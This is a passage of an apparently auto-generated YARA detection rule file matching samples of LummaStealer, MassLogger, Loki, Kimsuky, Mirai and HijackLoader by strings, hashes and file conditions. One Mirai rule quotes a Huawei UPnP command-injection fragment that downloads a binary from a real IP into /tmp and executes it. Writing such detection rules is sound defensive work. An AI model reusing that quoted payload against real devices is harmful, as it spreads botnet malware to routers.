      description = "_subset_batch - from files LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_34a2697f.exe, LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash)_1d9bd7df.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_30aaf493.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_6931da3b.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_83f4c42f.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_93b67e92.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8297cd00e6dd7a00a075bcb618e9864632fe1aeca0f15cd630f1e7d665d262b2"
      hash2 = "34a2697f63fe5c7752c039edbc7acae72858be60ff3e13b0109872bca01f4809"
      hash3 = "bde9b8b30e8700d3c2759ef0792a3d556063e78670ee31ef19676e5a1a1861cf"
      hash4 = "1d9bd7dfac193a4dfab75e59091f93b2a46232a7a461a6af02b0dddb0b509346"
      hash5 = "852fd8e572f18ab2f694153a8943c2ef198c2a5bf6179e7bef30c6dc79f84811"
      hash6 = "30aaf493758998d58bd9ec2b9c0e40b19a259963f777da91afe60f859f4327a3"
      hash7 = "6931da3b18f6ec11042ec36f39f00ff9e565e775147e33105655666e473badd5"
      hash8 = "83f4c42f9867e19b087e43e111f39018cc90fa2710a99947cd3f2fec69427641"
      hash9 = "93b67e925e2b9bfe548c1437a40bc558b2b598f5f9c40c34c7c372814e8b89f4"
   strings:
      $s1 = "runtime.hexdumpWords.func1" fullword ascii /* score: '20.00'*/
      $s2 = "dwactiveprocessormask" fullword ascii /* score: '19.00'*/
      $s3 = "dwnumberofprocessors" fullword ascii /* score: '19.00'*/
      $s4 = "wprocessorrevision" fullword ascii /* score: '19.00'*/
      $s5 = "wprocessorlevel" fullword ascii /* score: '19.00'*/
      $s6 = "dwprocessortype" fullword ascii /* score: '19.00'*/
      $s7 = "*runtime.rwmutex" fullword ascii /* score: '18.00'*/
      $s8 = "**struct { F uintptr; rw *runtime.rwmutex }" fullword ascii /* score: '18.00'*/
      $s9 = "sweepdone" fullword ascii /* score: '13.00'*/
      $s10 = "runtime.(*mspan).sweep" fullword ascii /* score: '12.00'*/
      $s11 = "runlock" fullword ascii /* score: '11.00'*/
      $s12 = "*runtime.systeminfo" fullword ascii /* score: '11.00'*/
      $s13 = "runtime.name.nameLen" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.name.tagLen" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.gcWaitOnMark" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__LummaStealer_signature__4035d2883e01d64f3e7a9dccb1d63af5__42 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_34a2697f.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_d20503a6.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_ea37de23.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8297cd00e6dd7a00a075bcb618e9864632fe1aeca0f15cd630f1e7d665d262b2"
      hash2 = "34a2697f63fe5c7752c039edbc7acae72858be60ff3e13b0109872bca01f4809"
      hash3 = "f37b9940d7ab8158b62bd0ca600cde35dffc36d64f5820931de7da9626fbe478"
      hash4 = "d20503a6c683c4cfddc10051531db2ab1b43be7d1b786d71f65938ce84812bbe"
      hash5 = "ea37de23a99f57a12361c094bfedc9cb91356f1d729a313ae68fcb86febf5701"
   strings:
      $s1 = "y failed; errno=runtime: bad notifyList size - sync=runtime: invalid pc-encoded table f=runtime: invalid typeBitsBulkBarrierrunt" ascii /* score: '30.00'*/
      $s2 = "ems && freeIndex == s.nelemsslice bounds out of range [::%x] with capacity %yattempt to execute system stack code on user stackc" ascii /* score: '23.00'*/
      $s3 = "level 3 resetload64 failedmin too largenil stackbaseout of memorypowrprof.dll" fullword ascii /* score: '23.00'*/
      $s4 = "bad defer entry in panicbad defer size class: i=bypassed recovery failedcan't scan our own stackconnection reset by peerdouble t" ascii /* score: '22.00'*/
      $s5 = "e nmspinninginvalid runtime symbol tablemheap.freeSpanLocked - span missing stack in shrinkstackmspan.sweep: m is not lockednewp" ascii /* score: '20.00'*/
      $s6 = "?*struct { lock runtime.mutex; used uint32; fn func(bool) bool }" fullword ascii /* score: '18.00'*/
      $s7 = "characterpanicwrap: unexpected string after package name: runtime: unexpected waitm - semaphore out of syncs.allocCount != s.nel" ascii /* score: '18.00'*/
      $s8 = "e to parking on channelruntime: CreateIoCompletionPort failed (errno= slice bounds out of range [::%x] with length %yCreateWaita" ascii /* score: '16.00'*/
      $s9 = "runtime.headTailIndex.tail" fullword ascii /* score: '15.00'*/
      $s10 = "ization - linker skewruntime: unable to acquire - semaphore out of syncGC must be disabled to protect validity of fn valuefatal:" ascii /* score: '15.00'*/
      $s11 = " systemstack called from unexpected goroutinepotentially overlapping in-use allocations detectedruntime: netpoll: PostQueuedComp" ascii /* score: '14.00'*/
      $s12 = "y unfreed span set block found in resetinvalid memory address or nil pointer dereferenceinvalid or incomplete multibyte or wide " ascii /* score: '12.00'*/
      $s13 = "runtime._WSAGetOverlappedResult" fullword ascii /* score: '12.00'*/
      $s14 = "bleTimerEx when creating timer failedcould not find GetSystemTimeAsFileTime() syscallruntime.preemptM: duplicatehandle failed; e" ascii /* score: '11.00'*/
      $s15 = "sync/atomic.CompareAndSwapInt32.args_stackmap" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__932857e7_MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5_43 {
   meta:
      description = "_subset_batch - from files MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_932857e7.exe, MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d271fd8c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "932857e7d796c0ea5002d21a2f6fe9646fc1de0548c2847d6dfe0458dc1398cc"
      hash2 = "d271fd8cdb9d18bb653545cee69547ca2c6114bf2e810b04d81734b323cacfe6"
   strings:
      $s1 = "targetTimeZoneId" fullword ascii /* score: '14.00'*/
      $s2 = "GetStopwatchElapsed" fullword ascii /* score: '9.00'*/
      $s3 = "GetActiveStopwatches" fullword ascii /* score: '9.00'*/
      $s4 = "GetTimeInTimezone" fullword ascii /* score: '9.00'*/
      $s5 = "GetActiveCountdownTimers" fullword ascii /* score: '9.00'*/
      $s6 = "GetTimeZoneDisplayName" fullword ascii /* score: '9.00'*/
      $s7 = "GetAvailableTimeZones" fullword ascii /* score: '9.00'*/
      $s8 = "GetTimeZoneOffset" fullword ascii /* score: '9.00'*/
      $s9 = "GetCountdownRemaining" fullword ascii /* score: '9.00'*/
      $s10 = "stopwatches" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( all of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__c7269d59926fa4252270f407e4dab043_imphash__LummaStealer_signature__c7269d59926fa4252270f407e4dab043__44 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_d20503a6.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_ea37de23.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f37b9940d7ab8158b62bd0ca600cde35dffc36d64f5820931de7da9626fbe478"
      hash2 = "d20503a6c683c4cfddc10051531db2ab1b43be7d1b786d71f65938ce84812bbe"
      hash3 = "ea37de23a99f57a12361c094bfedc9cb91356f1d729a313ae68fcb86febf5701"
   strings:
      $s1 = "morebuf={pc:advertise errorasyncpreemptoffforce gc (idle)key has expiredmalloc deadlockmisaligned maskmissing mcache?ms: gomaxpr" ascii /* score: '19.00'*/
      $s2 = "ocs=network is downno medium foundno such processpreempt SPWRITErecovery failedruntime error: runtime.gopanicruntime: frame runt" ascii /* score: '18.00'*/
      $s3 = "runtime._RtlGetNtVersionNumbers" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.(*sweepLocker).blockCompletion" fullword ascii /* score: '15.00'*/
      $s5 = "runtime.newSweepLocker" fullword ascii /* score: '15.00'*/
      $s6 = "runtime.(*sweepLocker).dispose" fullword ascii /* score: '12.00'*/
      $s7 = "runtime.(*sweepLocker).sweepIsDone" fullword ascii /* score: '12.00'*/
      $s8 = "syscall.procRtlGetNtVersionNumbers" fullword ascii /* score: '11.00'*/
      $s9 = "runtime.abiRegArgsEface" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.gcenable_setup" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.abiRegArgsType" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.longFileName" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.init.7" fullword ascii /* score: '10.00'*/
      $s14 = "letionStatus failedcasfrom_Gscanstatus: gp->status is not in scan statefunction symbol table not sorted by program counter:mallo" ascii /* score: '8.00'*/
      $s15 = "ime: max = runtime: min = runtimer: bad pscan missed a gstartm: m has pstopm holding p already; errno= mheap.sweepgen= not in ra" ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and pe.imphash() == "c7269d59926fa4252270f407e4dab043" and ( 8 of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__1aae8bf580c846f39c71c05898e57e88_imphash__LummaStealer_signature__1aae8bf580c846f39c71c05898e57e88__45 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_1f8a0a52.exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_34a2697f.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_d20503a6.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_ea37de23.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ec1bf2523cc8eedddae9d7d4c657f210886b9f4cb085858310d97be8dd90b33f"
      hash2 = "1f8a0a528ce10785f929770fd9b1a3bb4d02f9f187ec0f7aab701b7a252c7099"
      hash3 = "8297cd00e6dd7a00a075bcb618e9864632fe1aeca0f15cd630f1e7d665d262b2"
      hash4 = "34a2697f63fe5c7752c039edbc7acae72858be60ff3e13b0109872bca01f4809"
      hash5 = "f37b9940d7ab8158b62bd0ca600cde35dffc36d64f5820931de7da9626fbe478"
      hash6 = "d20503a6c683c4cfddc10051531db2ab1b43be7d1b786d71f65938ce84812bbe"
      hash7 = "ea37de23a99f57a12361c094bfedc9cb91356f1d729a313ae68fcb86febf5701"
   strings:
      $s1 = "runtime/rwmutex.go" fullword ascii /* score: '18.00'*/
      $s2 = "sync/mutex.go" fullword ascii /* score: '15.00'*/
      $s3 = "runtime/fastlog2.go" fullword ascii /* score: '12.00'*/
      $s4 = "runtime/time_nofake.go" fullword ascii /* score: '12.00'*/
      $s5 = "runtime/mgcsweep.go" fullword ascii /* score: '12.00'*/
      $s6 = "This program can only be run on processors with MMX support." fullword ascii /* score: '11.00'*/
      $s7 = "sync/atomic.CompareAndSwapInt32" fullword ascii /* score: '11.00'*/
      $s8 = "runtime.int64tofloat64" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.uint64div" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.int64mod" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.uint32tofloat64" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.slowdodiv" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.panicExtendIndexU" fullword ascii /* score: '10.00'*/
      $s14 = "runtime/error.go" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.float64toint64" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__LummaStealer_signature__4035d2883e01d64f3e7a9dccb1d63af5__46 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_34a2697f.exe, LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash)_1d9bd7df.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8297cd00e6dd7a00a075bcb618e9864632fe1aeca0f15cd630f1e7d665d262b2"
      hash2 = "34a2697f63fe5c7752c039edbc7acae72858be60ff3e13b0109872bca01f4809"
      hash3 = "bde9b8b30e8700d3c2759ef0792a3d556063e78670ee31ef19676e5a1a1861cf"
      hash4 = "1d9bd7dfac193a4dfab75e59091f93b2a46232a7a461a6af02b0dddb0b509346"
   strings:
      $s1 = "address already in useadvapi32.dll not foundargument list too longassembly checks failedbad g->status in readybad sweepgen in re" ascii /* score: '26.00'*/
      $s2 = " by zerointerface conversion: kernel32.dll not foundminpc or maxpc invalidnetwork is unreachablenon-Go function at pc=oldoverflo" ascii /* score: '19.00'*/
      $s3 = "aceGCSweepStartno buffer space availableno such device or addressoperation now in progressreleasep: invalid p stateremaining poi" ascii /* score: '17.00'*/
      $s4 = "e:scanstack: gp=s.freeindex > s.nelemsscanstack - bad statussend on closed channelspan has no free spacestack not a power of 2ti" ascii /* score: '16.00'*/
      $s5 = "allocSpan" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s6 = "CertGetCertificateChainFreeEnvironmentStringsWGetEnvironmentVariableWGetSystemTimeAsFileTimeMB during sweep; swept SetEnvironmen" ascii /* score: '13.00'*/
      $s7 = "internal/reflectlite.(*rtype).common" fullword ascii /* score: '11.00'*/
      $s8 = "egc: phase errorgc_trigger underflowgo of nil func valuegopark: bad g statusinvalid request codeis a named type filekey has been" ascii /* score: '10.00'*/
      $s9 = "w is not nilprotocol not availableprotocol not supportedremote address changedruntime.main not on m0runtime: work.nwait = runtim" ascii /* score: '10.00'*/
      $s10 = "runtime.setGCPercent.func1" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.gFromTLS" fullword ascii /* score: '10.00'*/
      $s12 = "internal/reflectlite.(*rtype).Key" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.gcEffectiveGrowthRatio" fullword ascii /* score: '10.00'*/
      $s14 = "ueuedCompletionStatus_cgo_thread_start missingallgadd: bad status Gidlearena already initializedbad status in shrinkstackbad sys" ascii /* score: '10.00'*/
      $s15 = "sweepArenas" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__0502879b_Mirai_signature__06206066_Mirai_signature__0bf46e99_47 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_0502879b.elf, Mirai(signature)_06206066.elf, Mirai(signature)_0bf46e99.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0502879b7c0df72bc5d892e0fba94f907637ddef67be4369e115fdf718e90e52"
      hash2 = "06206066d750db625368621b51a988cad9f8e7a1d1311c84c24b885d5454578a"
      hash3 = "0bf46e99ac5571896b1556a14962e8d7dd9f52e54b163c58f14b90231bbdcd20"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 192.227.134.76 -l /tmp/.kx -r /resgod.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDownl" ascii /* score: '20.00'*/
      $s3 = "[DEBUG] killer_init: Initializing killer process" fullword ascii /* score: '15.00'*/
      $s4 = "[DEBUG] killer_kill: Killing killer process" fullword ascii /* score: '15.00'*/
      $s5 = "[DEBUG] killer_init: Not running in child or fork failed" fullword ascii /* score: '10.00'*/
      $s6 = "oadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s7 = "lsfqbwlq" fullword ascii /* score: '8.00'*/
      $s8 = "pvsslqw" fullword ascii /* score: '8.00'*/
      $s9 = "brvbqjl" fullword ascii /* score: '8.00'*/
      $s10 = "wpdljmdlm" fullword ascii /* score: '8.00'*/
      $s11 = "nlwlqlob" fullword ascii /* score: '8.00'*/
      $s12 = "wjfppfbgn" fullword ascii /* score: '8.00'*/
      $s13 = "bgpoqllw" fullword ascii /* score: '8.00'*/
      $s14 = "wfomfwbgnjm" fullword ascii /* score: '8.00'*/
      $s15 = "pvsfqujplq" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Kimsuky_signature__b66e456457142424c4274ccc4a6e3326_imphash__LummaStealer_signature__1aae8bf580c846f39c71c05898e57e88_impha_48 {
   meta:
      description = "_subset_batch - from files Kimsuky(signature)_b66e456457142424c4274ccc4a6e3326(imphash).exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_1f8a0a52.exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_34a2697f.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_d20503a6.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_ea37de23.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "84f4f2e77b6e59c1fe54360842821fbfc6cdab039f197147b30876ed7da3647c"
      hash2 = "ec1bf2523cc8eedddae9d7d4c657f210886b9f4cb085858310d97be8dd90b33f"
      hash3 = "1f8a0a528ce10785f929770fd9b1a3bb4d02f9f187ec0f7aab701b7a252c7099"
      hash4 = "8297cd00e6dd7a00a075bcb618e9864632fe1aeca0f15cd630f1e7d665d262b2"
      hash5 = "34a2697f63fe5c7752c039edbc7acae72858be60ff3e13b0109872bca01f4809"
      hash6 = "f37b9940d7ab8158b62bd0ca600cde35dffc36d64f5820931de7da9626fbe478"
      hash7 = "d20503a6c683c4cfddc10051531db2ab1b43be7d1b786d71f65938ce84812bbe"
      hash8 = "ea37de23a99f57a12361c094bfedc9cb91356f1d729a313ae68fcb86febf5701"
   strings:
      $s1 = "runtime.injectglist.func1" fullword ascii /* score: '20.00'*/
      $s2 = "runtime.errorAddressString.Error" fullword ascii /* score: '16.00'*/
      $s3 = "runtime.sweepone.func1" fullword ascii /* score: '15.00'*/
      $s4 = "*runtime.errorAddressString" fullword ascii /* score: '13.00'*/
      $s5 = "runtime.offAddr.add" fullword ascii /* score: '13.00'*/
      $s6 = "runtime.pMask.set" fullword ascii /* score: '13.00'*/
      $s7 = "runtime.(*errorAddressString).Error" fullword ascii /* score: '13.00'*/
      $s8 = "*runtime.pcHeader" fullword ascii /* score: '12.00'*/
      $s9 = "runtime.(*mheap).nextSpanForSweep" fullword ascii /* score: '12.00'*/
      $s10 = "runtime.sweepClass.split" fullword ascii /* score: '11.00'*/
      $s11 = "runtime.getMCache" fullword ascii /* score: '11.00'*/
      $s12 = "runtime.lockRank.String" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.full" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.makeslicecopy" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.printanycustomtype" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Loki_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0_49 {
   meta:
      description = "_subset_batch - from files Loki(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_09b8a801.exe, MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_faa236ea.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a8dabe249da520a24de691d48bf2549dda65bbb3e62cecd148b1ff0080533cac"
      hash2 = "09b8a80183a41a92c60fbacf9ee319291e37ae6d4ce0521b23b236b46e095956"
      hash3 = "faa236eaf11ddab3abe7dcc8c69613d89edf60da47060bf6dc881fa9e118cd9e"
   strings:
      $s1 = "GetDigitalRoot" fullword ascii /* score: '12.00'*/
      $s2 = "get_DigitalRoot" fullword ascii /* score: '12.00'*/
      $s3 = "GetAllFactors" fullword ascii /* score: '9.00'*/
      $s4 = "get_IsArmstrong" fullword ascii /* score: '9.00'*/
      $s5 = "<GetPrimesWithDigitSum>b__0" fullword ascii /* score: '9.00'*/
      $s6 = "get_IsAbundant" fullword ascii /* score: '9.00'*/
      $s7 = "GetNthPrime" fullword ascii /* score: '9.00'*/
      $s8 = "get_IsPrime" fullword ascii /* score: '9.00'*/
      $s9 = "get_ShowStatistics" fullword ascii /* score: '9.00'*/
      $s10 = "GetPrimeFactorization" fullword ascii /* score: '9.00'*/
      $s11 = "get_IsPalindromic" fullword ascii /* score: '9.00'*/
      $s12 = "get_IsDeficient" fullword ascii /* score: '9.00'*/
      $s13 = "GetProperDivisors" fullword ascii /* score: '9.00'*/
      $s14 = "get_FactorCount" fullword ascii /* score: '9.00'*/
      $s15 = "GetDigitSum" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__1aae8bf580c846f39c71c05898e57e88_imphash__1f8a0a52_LummaStealer_signature__4035d2883e01d64f3e7a9dcc_50 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_1f8a0a52.exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_34a2697f.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_d20503a6.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_ea37de23.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1f8a0a528ce10785f929770fd9b1a3bb4d02f9f187ec0f7aab701b7a252c7099"
      hash2 = "8297cd00e6dd7a00a075bcb618e9864632fe1aeca0f15cd630f1e7d665d262b2"
      hash3 = "34a2697f63fe5c7752c039edbc7acae72858be60ff3e13b0109872bca01f4809"
      hash4 = "f37b9940d7ab8158b62bd0ca600cde35dffc36d64f5820931de7da9626fbe478"
      hash5 = "d20503a6c683c4cfddc10051531db2ab1b43be7d1b786d71f65938ce84812bbe"
      hash6 = "ea37de23a99f57a12361c094bfedc9cb91356f1d729a313ae68fcb86febf5701"
   strings:
      $s1 = "runtime.levelLogPages" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.sysDirectory" fullword ascii /* score: '14.00'*/
      $s3 = "runtime.sysDirectoryLen" fullword ascii /* score: '14.00'*/
      $s4 = "runtime.memoryError" fullword ascii /* score: '13.00'*/
      $s5 = "runtime.divideError" fullword ascii /* score: '13.00'*/
      $s6 = "runtime.cbs" fullword ascii /* score: '13.00'*/
      $s7 = "runtime.boundsNegErrorFmts" fullword ascii /* score: '13.00'*/
      $s8 = "runtime.floatError" fullword ascii /* score: '13.00'*/
      $s9 = "runtime.boundsErrorFmts" fullword ascii /* score: '13.00'*/
      $s10 = "runtime.overflowError" fullword ascii /* score: '13.00'*/
      $s11 = "runtime.shiftError" fullword ascii /* score: '13.00'*/
      $s12 = "runtime.staticuint64s" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.inittrace" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.maxOffAddr" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.stringEface" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__LummaStealer_signature__4035d2883e01d64f3e7a9dccb1d63af5__51 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_34a2697f.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_d20503a6.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_ea37de23.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8297cd00e6dd7a00a075bcb618e9864632fe1aeca0f15cd630f1e7d665d262b2"
      hash2 = "34a2697f63fe5c7752c039edbc7acae72858be60ff3e13b0109872bca01f4809"
      hash3 = "d20503a6c683c4cfddc10051531db2ab1b43be7d1b786d71f65938ce84812bbe"
      hash4 = "ea37de23a99f57a12361c094bfedc9cb91356f1d729a313ae68fcb86febf5701"
   strings:
      $x1 = "GetAddrInfoWGetLastErrorGetLengthSidGetStdHandleGetTempPathWLoadLibraryWReadConsoleWResumeThreadSetEndOfFileTransmitFileVirtualA" ascii /* score: '44.00'*/
      $x2 = "bad flushGen bad map stateexchange fullfatal error: gethostbynamegetservbynamekernel32.dll" fullword ascii /* score: '33.00'*/
      $s3 = "llocabi mismatchadvapi32.dllbad flushGenbad g statusbad g0 stackbad recoverycan't happencas64 failedchan receivedumping heapend " ascii /* score: '29.00'*/
      $s4 = "mstartbad sequence numberdevice not a streamdirectory not emptydisk quota exceededdodeltimer: wrong Pfile already closedfile alr" ascii /* score: '27.00'*/
      $s5 = "entifier removedindex out of rangeinput/output errormultihop attemptedno child processesno locks availableoperation canceledrunt" ascii /* score: '26.00'*/
      $s6 = "cialnetapi32.dllraceFiniLockreleasep: m=runtime: gp=runtime: sp=self-preemptspanSetSpinesweepWaiterstraceStringswirep: p->m=work" ascii /* score: '24.00'*/
      $s7 = "GOMAXPROCSGetIfEntryGetVersionWSACleanupWSAStartupatomicand8complex128debug calldnsapi.dllexitThreadfloat32nanfloat64nangetsocko" ascii /* score: '23.00'*/
      $s8 = "GOMAXPROCSGetIfEntryGetVersionWSACleanupWSAStartupatomicand8complex128debug calldnsapi.dllexitThreadfloat32nanfloat64nangetsocko" ascii /* score: '23.00'*/
      $s9 = "GetLongPathNameWGetThreadContextNetApiBufferFreeOpenProcessTokenRegQueryInfoKeyWRegQueryValueExWRemoveDirectoryWSetFilePointerEx" ascii /* score: '23.00'*/
      $s10 = "CreateHardLinkWDeviceIoControlDuplicateHandleFailed to find Failed to load FlushViewOfFileGetAdaptersInfoGetCommandLineWGetProce" ascii /* score: '22.00'*/
      $s11 = "CreateDirectoryWDnsNameCompare_WFlushFileBuffersGC scavenge waitGC worker (idle)GODEBUG: value \"GetComputerNameWGetFullPathName" ascii /* score: '22.00'*/
      $s12 = "CertCloseStoreCreateProcessWCryptGenRandomFindFirstFileWFormatMessageWGC assist waitGC worker initGetConsoleModeGetProcAddressGe" ascii /* score: '22.00'*/
      $s13 = "GetAddrInfoWGetLastErrorGetLengthSidGetStdHandleGetTempPathWLoadLibraryWReadConsoleWResumeThreadSetEndOfFileTransmitFileVirtualA" ascii /* score: '22.00'*/
      $s14 = "WriteProcessMemorybad manualFreeListconnection refusedfaketimeState.lockfile name too longforEachP: not donegarbage collectionid" ascii /* score: '20.00'*/
      $s15 = "corrupted semaphore ticketentersyscall inconsistent forEachP: P did not run fnfreedefer with d.fn != nilinitSpan: unaligned leng" ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _HijackLoader_signature__00efed44c47255dff78fbfc7f266ee4b_imphash__LummaStealer_signature__2cfee53aeb00cd14e32ccbca525e1ea5__52 {
   meta:
